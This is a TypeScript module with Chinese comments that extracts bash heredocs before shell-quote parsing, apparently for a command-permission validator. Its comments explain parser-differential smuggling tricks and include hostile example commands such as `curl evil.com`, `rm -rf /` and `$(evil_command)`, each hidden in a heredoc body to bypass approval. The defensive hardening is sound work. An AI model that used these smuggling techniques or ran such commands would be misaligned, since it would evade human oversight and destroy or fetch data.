/**
 * Heredoc 提取与还原工具。
 *
 * shell-quote 库会把 `<<` 解析成两个独立的 `<` 重定向运算符，
 * 这会破坏含 heredoc 语法的命令拆分。本模块在解析前先提取 heredoc、
 * 解析后再还原。
 *
 * 支持的 heredoc 变体：
 * - <<WORD      - 基础 heredoc
 * - <<'WORD'    - 单引号定界符（内容不做变量展开）
 * - <<"WORD"    - 双引号定界符（内容做变量展开）
 * - <<-WORD     - 短横前缀（从内容剥离行首制表符）
 * - <<-'WORD'   - 短横与引号定界符组合
 *
 * 已知限制：
 * - 反引号命令替换内部的 heredoc 可能无法提取
 * - 非常复杂的多 heredoc 场景可能无法提取
 *
 * 提取失败时命令原样通过。这是安全的：未提取的 heredoc 要么导致
 * shell-quote 解析失败（回退为把整条命令当一个整体），要么要求对每个
 * 看似子命令的部分单独人工批准。
 *
 * @module
 */

import { randomBytes } from 'crypto'

const HEREDOC_PLACEHOLDER_PREFIX = '__HEREDOC_'
const HEREDOC_PLACEHOLDER_SUFFIX = '__'

/**
 * 生成随机十六进制串作为占位符盐值，防止命令文本里恰好出现
 * "__HEREDOC_N__" 时发生碰撞。
 */
function generatePlaceholderSalt(): string {
  // 生成 8 个随机字节的十六进制表示（16 字符）
  return randomBytes(8).toString('hex')
}

/**
 * 匹配 heredoc 起始语法的正则。
 *
 * 两个分支分别处理带引号与不带引号的定界符：
 *
 * 分支 1（带引号）：(['"]) (\\?\w+) \2
 *   先捕获开引号，再捕获定界符单词（引号内允许前导反斜杠，因为是字面量），
 *   最后捕获闭引号。bash 中单引号使一切（含反斜杠）都成为字面量：
 *     <<'\EOF' → 定界符是 \EOF（含反斜杠）
 *     <<'EOF'  → 定界符是 EOF
 *   双引号在非特殊字符前同样保留反斜杠：
 *     <<"\EOF" → 定界符是 \EOF
 *
 * 分支 2（不带引号）：\\?(\w+)
 *   可选地消费一个前导反斜杠（转义），再捕获单词。bash 中不带引号的
 *   反斜杠转义下一个字符：
 *     <<\EOF → 定界符是 EOF（反斜杠作为转义被消费）
 *     <<EOF  → 定界符是 EOF（普通）
 *
 * 安全：对带引号的定界符，反斜杠必须在捕获组内；对不带引号的必须在
 * 捕获组外。旧正则是无条件把 \\? 放在捕获组外，导致 <<'\EOF' 提取出
 * 定界符 "EOF" 而 bash 实际用 "\EOF"，造成命令走私。
 *
 * 注意：用 [ \t]* 而不用 \s*，避免跨换行匹配（否则可能把 << 与定界符
 * 之间的命令隐藏起来，是安全问题）。
 */
const HEREDOC_START_PATTERN =
  // eslint-disable-next-line custom-rules/no-lookbehind-regex -- 由 extractHeredocs() 入口的 command.includes('<<') 门控
  /(?<!<)<<(?!<)(-)?[ \t]*(?:(['"])(\\?\w+)\2|\\?(\w+))/

export type HeredocInfo = {
  /** 含 << 运算符、定界符、内容与闭定界符的完整 heredoc 文本 */
  fullText: string
  /** 定界符单词（不含引号） */
  delimiter: string
  /** 原命令中 << 运算符的起始位置 */
  operatorStartIndex: number
  /** << 运算符的结束位置（不含）——同行的剩余内容保留 */
  operatorEndIndex: number
  /** heredoc 内容的起始位置（内容前那个换行符） */
  contentStartIndex: number
  /** heredoc 内容含闭定界符的结束位置（不含） */
  contentEndIndex: number
}

export type HeredocExtractionResult = {
  /** heredoc 被占位符替换后的命令 */
  processedCommand: string
  /** 占位符到原 heredoc 信息的映射 */
  heredocs: Map<string, HeredocInfo>
}

/**
 * 从命令字符串提取 heredoc 并用占位符替换。
 *
 * 这使 shell-quote 能在不破坏 heredoc 语法的情况下解析命令。
 * 解析后用 `restoreHeredocs` 把占位符还原为原始内容。
 *
 * @param command - 可能含 heredoc 的 shell 命令字符串
 * @returns 处理后的命令 + 占位符到 heredoc 信息的映射
 *
 * @example
 * ```ts
 * const result = extractHeredocs(`cat <<EOF
 * hello world
 * EOF`);
 * // result.processedCommand === "cat __HEREDOC_0_a1b2c3d4__"（盐值随机）
 * // result.heredocs 保存了之后还原用的映射
 * ```
 */
export function extractHeredocs(
  command: string,
  options?: { quotedOnly?: boolean },
): HeredocExtractionResult {
  const heredocs = new Map<string, HeredocInfo>()

  // 快速检查：没有 << 直接跳过
  if (!command.includes('<<')) {
    return { processedCommand: command, heredocs }
  }

  // 安全：偏执的预校验。我们的增量引号/注释扫描器（见下方 advanceScan）
  // 是简化解析，无法处理所有 bash 引号结构。如果命令含有会使引号跟踪
  // 失步的结构，整体放弃，而不是冒险用错误边界提取 heredoc。
  // 这是纵深防御：下面每个结构都曾导致或可能在没有防御时导致安全绕过。
  //
  // 具体而言，命令含以下内容时放弃：
  // 1. $'...' 或 $"..."（ANSI-C / locale 引号——引号跟踪器不处理 $ 前缀，
  //    会误解析引号）
  // 2. 反引号命令替换（反引号嵌套解析规则复杂，且反引号在 make_cmd.c:606
  //    中充当 shell_eof_token，可提前关闭 heredoc，我们的解析器无法复刻）
  if (/\$['"]/.test(command)) {
    return { processedCommand: command, heredocs }
  }
  // 检查第一个 << 之前的命令文本是否含反引号。
  // 反引号嵌套解析规则复杂，且反引号充当 shell_eof_token（make_cmd.c:606），
  // 可提前关闭 heredoc。只检查 << 之前，因为 heredoc 正文里的反引号无害。
  const firstHeredocPos = command.indexOf('<<')
  if (firstHeredocPos > 0 && command.slice(0, firstHeredocPos).includes('`')) {
    return { processedCommand: command, heredocs }
  }

  // 安全：检查第一个 `<<` 之前是否处于算术求值上下文。bash 中
  // `(( x = 1 << 2 ))` 的 `<<` 是位移运算符，不是 heredoc。若误提取，
  // 后续行会变成 "heredoc 内容" 被安全校验器隐藏，而 bash 却把它们当
  // 独立命令执行。当 `<<` 前出现未配平的 `((` 时整体放弃——该上下文中
  // 我们无法可靠区分算术 `<<` 与 heredoc `<<`。注意：$(( 已被
  // validateDangerousPatterns 覆盖，但裸 (( 没有。
  if (firstHeredocPos > 0) {
    const beforeHeredoc = command.slice(0, firstHeredocPos)
    // 统计 (( 与 )) 出现次数——不配平则 `<<` 可能是算术
    const openArith = (beforeHeredoc.match(/\(\(/g) || []).length
    const closeArith = (beforeHeredoc.match(/\)\)/g) || []).length
    if (openArith > closeArith) {
      return { processedCommand: command, heredocs }
    }
  }

  // 创建用于迭代的全局正则
  const heredocStartPattern = new RegExp(HEREDOC_START_PATTERN.source, 'g')

  const heredocMatches: HeredocInfo[] = []
  // 安全：quotedOnly 跳过不带引号的 heredoc 时，仍需记录其内容区间，
  // 以便嵌套过滤器拒绝出现在该被跳过正文内部的带引号 heredoc。否则
  // `cat <<EOF\n<<'SAFE'\n$(evil)\nSAFE\nEOF` 会把 <<'SAFE' 当作顶层
  // heredoc 提取，把 $(evil) 藏起来——而 bash 中 $(evil) 确实会被执行
  // （不带引号的 <<EOF 会展开其正文）。
  const skippedHeredocRanges: Array<{
    contentStartIndex: number
    contentEndIndex: number
  }> = []
  let match: RegExpExecArray | null

  // 增量引号/注释扫描器状态。
  //
  // 正则向前遍历命令，match.index 单调递增。旧实现里 isInsideQuotedString
  // 和 isInsideComment 每次匹配都从位置 0 重新扫描——当 heredoc 正文含
  // 大量 `<<`（如 C++ 的 `std::cout << ...`）时是 O(n²)。一个 200 行的
  // C++ heredoc 单次 extractHeredocs 调用约 3.7ms，而 Bash 安全校验每条
  // 命令会多次调用它。
  //
  // 改为增量跟踪引号/注释/转义状态，从上次扫描位置继续。这保留旧辅助
  // 函数的精确语义：
  //
  //   引号状态（原 isInsideQuotedString）对注释"失明"——它永远看不到 `#`，
  //   也不会因为"在注释里"而跳过字符。单引号内一切皆字面量；双引号内
  //   反斜杠转义下一字符；不带引号的奇数长度反斜杠串转义下一字符。
  //
  //   注释状态（原 isInsideComment）观察引号状态（引号内的 # 不是注释），
  //   但不反向观察。旧辅助函数用每次调用的
  //   `lineStart = lastIndexOf('\n', pos-1)+1` 界定哪些 `#` 算注释；
  //   等价地，任何物理 `\n` 都清除注释状态——包括引号内的 `\n`
  //   （因为 lastIndexOf 对引号失明）。
  //
  // 安全：绝不让注释模式抑制引号状态更新。如果 `#` 让扫描器进入跳过
  // 引号字符的模式，那么 `echo x#"\n<<...`（bash 把 `#` 当作单词 x# 的
  // 一部分而非注释）会报告该 `<<` 不带引号并提取它——把内容藏起来。
  // 旧的 isInsideQuotedString 对注释失明；我们保留该语义。新旧实现都会
  // 过度地把不带引号的 `#` 当注释（bash 要求词首才是注释），但既然引号
  // 跟踪独立，这种过度只会影响注释判断——导致跳过（安全方向），
  // 永远不会导致多余的提取。
  let scanPos = 0
  let scanInSingleQuote = false
  let scanInDoubleQuote = false
  let scanInComment = false
  // 双引号内：前一个字符是反斜杠则为 true（下一字符被转义）。
  // 跨 advanceScan 调用保持，使 scanPos-1 处的 `\` 能正确转义 scanPos 处字符。
  let scanDqEscapeNext = false
  // 不带引号的上下文：结束于 scanPos-1 的连续反斜杠串长度。
  // 用于判断 scanPos 处字符是否被转义（奇数串 = 被转义）。
  let scanPendingBackslashes = 0

  const advanceScan = (target: number): void => {
    for (let i = scanPos; i < target; i++) {
      const ch = command[i]!

      // 任何物理换行清除注释状态。旧 isInsideComment 用
      // `lineStart = lastIndexOf('\n', pos-1)+1`（对引号失明），所以引号内
      // 的 `\n` 也会推进 lineStart。这里同样在引号分支之前清除以保持一致。
      if (ch === '\n') scanInComment = false

      if (scanInSingleQuote) {
        if (ch === "'") scanInSingleQuote = false
        continue
      }

      if (scanInDoubleQuote) {
        if (scanDqEscapeNext) {
          scanDqEscapeNext = false
          continue
        }
        if (ch === '\\') {
          scanDqEscapeNext = true
          continue
        }
        if (ch === '"') scanInDoubleQuote = false
        continue
      }

      // 不带引号的上下文。引号跟踪对注释失明（与旧 isInsideQuotedString
      // 相同）：我们不会因为"在注释里"而跳过字符。只有 `#` 的识别本身
      // 受不在注释中门控。
      if (ch === '\\') {
        scanPendingBackslashes++
        continue
      }
      const escaped = scanPendingBackslashes % 2 === 1
      scanPendingBackslashes = 0
      if (escaped) continue

      if (ch === "'") scanInSingleQuote = true
      else if (ch === '"') scanInDoubleQuote = true
      else if (!scanInComment && ch === '#') scanInComment = true
    }
    scanPos = target
  }

  while ((match = heredocStartPattern.exec(command)) !== null) {
    const startIndex = match.index

    // 把增量扫描器推进到本次匹配位置。之后 scanInSingleQuote/
    // scanInDoubleQuote/scanInComment 反映 startIndex 之前的解析器状态，
    // scanPendingBackslashes 是 startIndex 前紧邻的不带引号 `\` 数量。
    advanceScan(startIndex)

    // 若该 << 位于带引号字符串内则跳过（不是真正的 heredoc 运算符）。
    if (scanInSingleQuote || scanInDoubleQuote) {
      continue
    }

    // 安全：若该 << 位于注释内（不带引号的 # 之后）则跳过。
    // bash 中 `# <<EOF` 是注释——提取它会隐藏后续行命令为 "heredoc 内容"，
    // 而 bash 会执行它们。
    if (scanInComment) {
      continue
    }

    // 安全：若该 << 前有奇数个反斜杠则跳过。
    // bash 中 `\<<EOF` 不是 heredoc——`\<` 是字面 `<`，然后 `<EOF` 是输入
    // 重定向。提取它会从安全检查中丢弃同行命令。扫描器跟踪 startIndex
    // 前紧邻的不带引号反斜杠串（scanPendingBackslashes）。
    if (scanPendingBackslashes % 2 === 1) {
      continue
    }

    // 安全：若该 `<<` 落在先前被跳过的 heredoc（quotedOnly 模式下不带引号
    // 的 heredoc）正文内部则放弃。bash 中 heredoc 正文里的 `<<` 只是文本，
    // 不是嵌套 heredoc 运算符。提取它会隐藏 bash 实际会展开的内容。
    let insideSkipped = false
    for (const skipped of skippedHeredocRanges) {
      if (
        startIndex > skipped.contentStartIndex &&
        startIndex < skipped.contentEndIndex
      ) {
        insideSkipped = true
        break
      }
    }
    if (insideSkipped) {
      continue
    }

    const fullMatch = match[0]
    const isDash = match[1] === '-'
    // 组 3 = 带引号的定界符（可能含反斜杠），组 4 = 不带引号
    const delimiter = (match[3] || match[4])!
    const operatorEndIndex = startIndex + fullMatch.length

    // 安全：两项检查确认我们的正则捕获了完整定界符单词。
    // 我们解析的定界符与 bash 实际定界符的任何不一致都可能让命令
    // 绕过权限检查走私。

    // 检查 1：若捕获到引号（组 2），验证闭引号确实被正则的 \2 匹配
    // （带引号分支要求闭引号）。正则的 \w+ 只匹配 [a-zA-Z0-9_]，
    // 所以引号内的非单词字符（空格、连字符、点）会让 \w+ 提前停止，
    // 留下闭引号未匹配。
    // 例：<<"EO F" — 正则捕获 "EO"，漏掉闭引号，定界符本应是 "EO F"
    // 但我们用的是 "EO"。跳过以防不一致。
    const quoteChar = match[2]
    if (quoteChar && command[operatorEndIndex - 1] !== quoteChar) {
      continue
    }

    // 安全：判断定界符是带引号（'EOF'、"EOF"）还是被转义（\EOF）。
    // bash 中带引号/转义的定界符抑制 heredoc 正文的全部展开——内容是
    // 字面文本。不带引号的定界符（<<EOF）做完整 shell 展开：正文里的
    // $()、反引号和 ${} 都会被执行。quotedOnly 设置时跳过不带引号的
    // heredoc，使其正文对安全校验器可见（可能含可执行的命令替换）。
    const isEscapedDelimiter = fullMatch.includes('\\')
    const isQuotedOrEscaped = !!quoteChar || isEscapedDelimiter
    // 注意：quotedOnly 设置时我们不再在这里跳过不带引号的 heredoc。
    // 改为计算其内容区间加入 skippedHeredocRanges，并在找到闭定界符后
    // 再跳过。这让嵌套过滤器能正确拒绝出现在不带引号 heredoc 正文
    // 内部的带引号 "heredoc"。

    // 检查 2：验证匹配后的下一字符是 bash 单词终结符（元字符或串尾）。
    // 单词字符、引号、$、\ 等意味着 bash 单词延伸到我们的匹配之外
    // （例如 <<'EOF'a，bash 用 "EOFa" 而我们捕获了 "EOF"）。
    // 重要：只匹配 bash 的真实元字符——空格(0x20)、制表符(0x09)、
    // 换行(0x0A)、|、&、;、(、)、<、>。不要用 \s，它还会匹配 \r、\f、\v
    // 和 Unicode 空白，而这些 bash 当作普通单词字符而非终结符。
    if (operatorEndIndex < command.length) {
      const nextChar = command[operatorEndIndex]!
      if (!/^[ \t\n|&;()<>]$/.test(nextChar)) {
        continue
      }
    }

    // bash 中 heredoc 内容从运算符的下一行开始。<<EOF 后同行的任何内容
    // （如 " && echo done"）属于命令，不是 heredoc 内容。
    //
    // 安全："同一行"必须是逻辑命令行，而非第一个物理换行。多行带引号
    // 字符串会延伸逻辑行——bash 会等引号闭合后才开始读取 heredoc 正文。
    // 对引号失明的 `indexOf('\n')` 会找到带引号字符串内部的换行，
    // 导致正文过早开始。
    //
    // 利用：`echo <<'EOF' '${}\n' ; curl evil.com\nEOF`
    //   - `'${}\n'` 里的 `\n` 是带引号的（字符串参数中的字面换行）
    //   - Bash：等 `'` 闭合 → 逻辑行是
    //     `echo <<'EOF' '${}\n' ; curl evil.com` → heredoc 正文 = `EOF`
    //   - 旧代码：indexOf('\n') 找到带引号的换行 → 正文从
    //     `' ; curl evil.com\nEOF` 开始 → curl 被吞进占位符 →
    //     永远到不了权限检查。
    //
    // 修复：从 operatorEndIndex 用引号状态跟踪向前扫描，找到第一个
    // 不在带引号字符串内部的换行。引号跟踪语义与 advanceScan 相同
    // （上面已用来验证 `<<` 运算符的位置）。
    let firstNewlineOffset = -1
    {
      let inSingleQuote = false
      let inDoubleQuote = false
      // 从干净引号状态开始——advanceScan 已拒绝 `<<` 运算符本身在
      // 引号内的情况。
      for (let k = operatorEndIndex; k < command.length; k++) {
        const ch = command[k]
        if (inSingleQuote) {
          if (ch === "'") inSingleQuote = false
          continue
        }
        if (inDoubleQuote) {
          if (ch === '\\') {
            k++ // 跳过双引号内的被转义字符
            continue
          }
          if (ch === '"') inDoubleQuote = false
          continue
        }
        // 不带引号的上下文
        if (ch === '\n') {
          firstNewlineOffset = k - operatorEndIndex
          break
        }
        // 统计反斜杠以在不带引号上下文检测转义
        let backslashCount = 0
        for (let j = k - 1; j >= operatorEndIndex && command[j] === '\\'; j--) {
          backslashCount++
        }
        if (backslashCount % 2 === 1) continue // 被转义的字符
        if (ch === "'") inSingleQuote = true
        else if (ch === '"') inDoubleQuote = true
      }
      // 若结束时仍在引号内，逻辑行永不结束——没有 heredoc 正文。
      // 保持 firstNewlineOffset 为 -1（下面处理）。
    }

    // 若找不到不带引号的换行，该 heredoc 无内容——跳过
    if (firstNewlineOffset === -1) {
      continue
    }

    // 安全：检查同行内容（运算符与换行之间的文本）末尾的反斜杠-换行
    // 续行。bash 中 `\<newline>` 在 heredoc 解析之前连接行——所以：
    //   cat <<'EOF' && \
    //   rm -rf /
    //   content
    //   EOF
    // bash 连接成 `cat <<'EOF' && rm -rf /`（rm 属于命令行），
    // 然后 heredoc 正文 = `content`。我们的提取器在续行连接之前运行
    // （commands.ts:82），会把 `rm -rf /` 放进 heredoc 正文，
    // 从所有校验器面前藏起来。同行内容以奇数个反斜杠结尾时放弃。
    const sameLineContent = command.slice(
      operatorEndIndex,
      operatorEndIndex + firstNewlineOffset,
    )
    let trailingBackslashes = 0
    for (let j = sameLineContent.length - 1; j >= 0; j--) {
      if (sameLineContent[j] === '\\') {
        trailingBackslashes++
      } else {
        break
      }
    }
    if (trailingBackslashes % 2 === 1) {
      // 奇数个尾部反斜杠 → 最后一个转义换行 → 这是续行。
      // 我们的"先提取 heredoc 再处理续行"顺序会误解析。放弃。
      continue
    }

    const contentStartIndex = operatorEndIndex + firstNewlineOffset
    const afterNewline = command.slice(contentStartIndex + 1) // +1 跳过换行本身
    const contentLines = afterNewline.split('\n')

    // 找闭定界符——必须独占一行
    // 安全：必须精确匹配 bash 行为，防止解析差异导致命令走私绕过权限检查。
    let closingLineIndex = -1
    for (let i = 0; i < contentLines.length; i++) {
      const line = contentLines[i]!

      if (isDash) {
        // <<- 只剥离行首制表符（不剥离空格），按 POSIX/bash 规范。
        // 剥离行首制表符后的行必须恰好等于定界符。
        const stripped = line.replace(/^\t*/, '')
        if (stripped === delimiter) {
          closingLineIndex = i
          break
        }
      } else {
        // << 要求闭定界符恰好独占一行，无任何前导或尾随空白。
        // 与 bash 行为一致。
        if (line === delimiter) {
          closingLineIndex = i
          break
        }
      }

      // 安全：检查类似 PST_EOFTOKEN 的提前闭合（make_cmd.c:606）。
      // 在 $()、${} 或反引号替换内部，当某行以定界符开头且其后任意位置
      // 含 shell_eof_token（`)`、`}` 或反引号）时，bash 会关闭 heredoc。
      // 我们的解析器只做精确行匹配，这个差异可能隐藏走私命令。
      //
      // 偏执扩展：定界符后出现 bash 元字符（|、&、;、(、<、>）也放弃，
      // 它们可能来自我们尚未识别的解析差异。
      //
      // 对 <<- heredoc，bash 在此检查前剥离行首制表符。
      const eofCheckLine = isDash ? line.replace(/^\t*/, '') : line
      if (
        eofCheckLine.length > delimiter.length &&
        eofCheckLine.startsWith(delimiter)
      ) {
        const charAfterDelimiter = eofCheckLine[delimiter.length]!
        if (/^[)}`|&;(<>]$/.test(charAfterDelimiter)) {
          // 定界符后是 shell 元字符或替换闭合符——bash 可能在此提前
          // 关闭 heredoc。放弃。
          closingLineIndex = -1
          break
        }
      }
    }

    // 安全：quotedOnly 模式且这是不带引号的 heredoc 时，记录其内容区间
    // 供嵌套检查使用，但不加入 heredocMatches。这确保其正文内部的带引号
    // "heredoc" 会在后续迭代中被 insideSkipped 检查正确拒绝。
    //
    // 关键：这必须在 closingLineIndex === -1 检查之前做。若不带引号的
    // heredoc 没有闭定界符，bash 仍把到输入结束为止的内容都当作正文
    // （并在其中展开 $()）。我们必须阻止后续落在该无界正文内的带引号
    // "heredoc" 被提取。
    if (options?.quotedOnly && !isQuotedOrEscaped) {
      let skipContentEndIndex: number
      if (closingLineIndex === -1) {
        // 无闭定界符——bash 中 heredoc 正文延伸到输入结束。
        // 把剩余整个区间记为"被跳过正文"。
        skipContentEndIndex = command.length
      } else {
        const skipLinesUpToClosing = contentLines.slice(0, closingLineIndex + 1)
        const skipContentLength = skipLinesUpToClosing.join('\n').length
        skipContentEndIndex = contentStartIndex + 1 + skipContentLength
      }
      skippedHeredocRanges.push({
        contentStartIndex,
        contentEndIndex: skipContentEndIndex,
      })
      continue
    }

    // 若找不到闭定界符，格式非法——跳过
    if (closingLineIndex === -1) {
      continue
    }

    // 计算结束位置：contentStartIndex + 1（换行）+ 到含闭定界符为止各行的长度
    const linesUpToClosing = contentLines.slice(0, closingLineIndex + 1)
    const contentLength = linesUpToClosing.join('\n').length
    const contentEndIndex = contentStartIndex + 1 + contentLength

    // 安全：若该 heredoc 的内容区间与任何先前被跳过的 heredoc 内容区间
    // 重叠则放弃。这捕获两个 heredoc 共享一行命令的情况
    // （`cat <<EOF <<'SAFE'`），且第一个不带引号（quotedOnly 模式下被跳过）。
    // bash 中多个 heredoc 共享一行时，其正文按顺序出现（先第一个的正文，
    // 再第二个的）。两者从同一换行计算 contentStartIndex，所以第二个的
    // 正文搜索会穿过第一个的正文。例如：
    //   cat <<EOF <<'SAFE'
    //   $(evil_command)
    //   EOF
    //   safe body
    //   SAFE
    // ...带引号的 <<'SAFE' 会错误地把第 2-4 行当作其正文，把 $(evil_command)
    // （bash 通过不带引号 <<EOF 的展开执行它）吞进占位符，从校验器面前
    // 藏起来。
    //
    // 上面的 insideSkipped 检查抓不到这个，因为带引号运算符的 startIndex
    // 在 contentStart 之前的命令行上。下面的 contentStartPositions 去重
    // 检查也抓不到，因为被跳过的 heredoc 在 skippedHeredocRanges 里而不在
    // topLevelHeredocs 里。
    let overlapsSkipped = false
    for (const skipped of skippedHeredocRanges) {
      // 区间 [a,b) 与 [c,d) 重叠当且仅当 a < d && c < b
      if (
        contentStartIndex < skipped.contentEndIndex &&
        skipped.contentStartIndex < contentEndIndex
      ) {
        overlapsSkipped = true
        break
      }
    }
    if (overlapsSkipped) {
      continue
    }

    // 构建 fullText：运算符 + 换行 + 内容（用于还原的规范化形式）
    // 这会创建一个可正确还原的干净 heredoc
    const operatorText = command.slice(startIndex, operatorEndIndex)
    const contentText = command.slice(contentStartIndex, contentEndIndex)
    const fullText = operatorText + contentText

    heredocMatches.push({
      fullText,
      delimiter,
      operatorStartIndex: startIndex,
      operatorEndIndex,
      contentStartIndex,
      contentEndIndex,
    })
  }

  // 若找不到合法 heredoc，返回原文
  if (heredocMatches.length === 0) {
    return { processedCommand: command, heredocs }
  }

  // 过滤嵌套 heredoc——运算符落在另一个 heredoc 内容区间内的应排除。
  // 防止 heredoc 内容含 << 模式时发生损坏。
  const topLevelHeredocs = heredocMatches.filter((candidate, _i, all) => {
    // 检查该候选的运算符是否在另一个 heredoc 的内容内
    for (const other of all) {
      if (candidate === other) continue
      // 检查候选的运算符是否在 other 的内容区间内
      if (
        candidate.operatorStartIndex > other.contentStartIndex &&
        candidate.operatorStartIndex < other.contentEndIndex
      ) {
        // 该 heredoc 嵌套在另一个内部——过滤掉
        return false
      }
    }
    return true
  })

  // 若过滤后没有剩余 heredoc，返回原文
  if (topLevelHeredocs.length === 0) {
    return { processedCommand: command, heredocs }
  }

  // 检查多个 heredoc 是否共享相同的内容起始位置（即在同一行）。
  // 这会导致替换时索引损坏，因为索引基于原字符串计算却应用在
  // 不断修改的字符串上。不提取直接返回——回退是安全的
  // （要求人工批准或解析失败）。
  const contentStartPositions = new Set(
    topLevelHeredocs.map(h => h.contentStartIndex),
  )
  if (contentStartPositions.size < topLevelHeredocs.length) {
    return { processedCommand: command, heredocs }
  }

  // 按内容结束位置降序排序，从后往前替换
  // （这为较早的替换保留索引）
  topLevelHeredocs.sort((a, b) => b.contentEndIndex - a.contentEndIndex)

  // 为本次提取生成唯一盐值，防止与命令中字面 "__HEREDOC_N__" 文本碰撞
  const salt = generatePlaceholderSalt()

  let processedCommand = command
  topLevelHeredocs.forEach((info, index) => {
    // 用反向索引，因为我们按降序排序
    const placeholderIndex = topLevelHeredocs.length - 1 - index
    const placeholder = `${HEREDOC_PLACEHOLDER_PREFIX}${placeholderIndex}_${salt}${HEREDOC_PLACEHOLDER_SUFFIX}`

    heredocs.set(placeholder, info)

    // 用占位符替换 heredoc，同时保留同行内容：
    // - 保留运算符之前的一切
    // - 运算符替换为占位符
    // - 保留运算符与 heredoc 内容之间的内容（如 " && echo done"）
    // - 移除 heredoc 内容（从换行到闭定界符）
    // - 保留闭定界符之后的一切
    processedCommand =
      processedCommand.slice(0, info.operatorStartIndex) +
      placeholder +
      processedCommand.slice(info.operatorEndIndex, info.contentStartIndex) +
      processedCommand.slice(info.contentEndIndex)
  })

  return { processedCommand, heredocs }
}

/**
 * 在单个字符串中把 heredoc 占位符还原为原始内容。
 * restoreHeredocs 使用的内部辅助函数。
 */
function restoreHeredocsInString(
  text: string,
  heredocs: Map<string, HeredocInfo>,
): string {
  let result = text
  for (const [placeholder, info] of heredocs) {
    result = result.replaceAll(placeholder, info.fullText)
  }
  return result
}

/**
 * 在字符串数组中还原 heredoc 占位符。
 *
 * @param parts - 可能含 heredoc 占位符的字符串数组
 * @param heredocs - `extractHeredocs` 返回的占位符映射
 * @returns 占位符被原始 heredoc 内容替换后的新数组
 */
export function restoreHeredocs(
  parts: string[],
  heredocs: Map<string, HeredocInfo>,
): string[] {
  if (heredocs.size === 0) {
    return parts
  }

  return parts.map(part => restoreHeredocsInString(part, heredocs))
}

/**
 * 检查命令是否含 heredoc 语法。
 *
 * 这只是快速检查，不验证 heredoc 是否格式良好，只判断模式是否存在。
 *
 * @param command - shell 命令字符串
 * @returns 命令看起来含 heredoc 语法时返回 true
 */
export function containsHeredoc(command: string): boolean {
  return HEREDOC_START_PATTERN.test(command)
}
